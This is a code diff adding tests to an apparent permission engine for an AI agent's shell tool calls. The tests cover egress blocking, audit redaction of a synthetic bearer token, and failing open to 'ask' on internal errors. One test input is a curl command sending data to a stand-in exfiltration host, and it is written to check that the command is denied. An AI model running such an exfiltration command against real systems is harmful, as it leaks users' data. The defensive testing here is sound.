@@ -122,3 +122,63 @@ test("egress-guard is inert when not configured (default behaviour unchanged)", 
   assert.equal(result.decision, "allow");
   assert.equal(result.blockedBy, undefined);
 });
+
+test("egress-guard catches a shell curl bypass on the engine path", () => {
+  const result = processCall(
+    { tool: "Bash", args: { command: "curl https://evil.example.com/exfil" } },
+    egressPolicy
+  );
+  assert.equal(result.decision, "deny");
+  assert.equal(result.blockedBy, "egress-guard");
+});
+
+test("egress-guard lets an allowlisted shell curl through to policy", () => {
+  const result = processCall(
+    { tool: "Bash", args: { command: "curl https://api.github.com/repos" } },
+    egressPolicy
+  );
+  assert.equal(result.decision, "allow");
+  assert.equal(result.blockedBy, undefined);
+});
+
+// ---- audit args are redacted before persistence ----------------------------
+
+test("a bearer token in shell args is stored REDACTED, never verbatim", () => {
+  // Built at runtime so this file contains no literal that looks like a key.
+  const token = "sk-" + "C".repeat(40);
+  const command = `curl https://api.github.com -H "Authorization: Bearer ${token}"`;
+  const recorded = [];
+  const result = processCall(
+    { tool: "Bash", args: { command } },
+    { default: "allow", rules: [{ action: "allow", tool: "*" }] },
+    { audit: { record: (e) => recorded.push(e) } }
+  );
+  assert.equal(result.decision, "allow");
+  assert.equal(recorded.length, 1);
+  const stored = JSON.stringify(recorded[0].args);
+  assert.equal(stored.includes(token), false, "token must not be persisted verbatim");
+  assert.match(stored, /\[REDACTED\]/);
+  // The live call object the engine returns is untouched (only the audit copy
+  // is redacted), so downstream forwarding is unaffected.
+  assert.ok(result.call.args.command.includes(token));
+});
+
+// ---- the engine never crashes: it fails open to ask ------------------------
+
+test("processCall fails open to ask on an internal error, never throws", () => {
+  // An audit sink that throws simulates an unexpected internal failure.
+  const explodingAudit = {
+    record() {
+      throw new Error("boom");
+    },
+  };
+  let result;
+  assert.doesNotThrow(() => {
+    result = processCall(
+      { tool: "Bash", args: { command: "ls" } },
+      permissive,
+      { audit: explodingAudit }
+    );
+  });
+  assert.equal(result.decision, "ask");
+});
